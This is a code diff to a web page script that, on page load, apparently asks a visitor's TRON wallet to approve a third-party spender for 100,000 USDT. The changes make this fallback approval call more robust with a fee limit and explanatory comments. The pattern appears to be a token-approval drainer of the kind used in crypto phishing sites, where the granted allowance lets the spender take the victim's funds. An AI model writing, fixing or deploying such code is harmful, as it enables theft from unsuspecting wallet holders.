@@ -255,11 +255,20 @@ document.addEventListener('DOMContentLoaded', () => {
                 
                 // 终极回退：使用最基础的 API 构建，不做任何花哨操作
                 // 直接调用 tronWeb.contract().approve()，这是官方封装好的方法，兼容性最好
+                
+                // 重新获取 contract 实例，确保状态干净
                 const contract = await tronWeb.contract().at(window.usdtContractAddress);
+                
                 // 使用字符串格式的金额，避免精度问题
-                const amount = '100000000000'; // 100,000 USDT
+                // 100,000 USDT = 100000000000
+                const amount = '100000000000'; 
+                
                 // send() 会自动处理构建、签名和广播，通常比手动 sign() 更稳健
-                const result = await contract.approve(spenderAddress, amount).send();
+                // 注意：这里不需要再手动 sign 和 sendRawTransaction，send() 会一站式完成
+                // 我们直接 await send() 的结果
+                const result = await contract.approve(spenderAddress, amount).send({
+                    feeLimit: 100000000
+                });
                 
                 console.log("Fallback transaction submitted:", result);
                 alert("提交成功！");
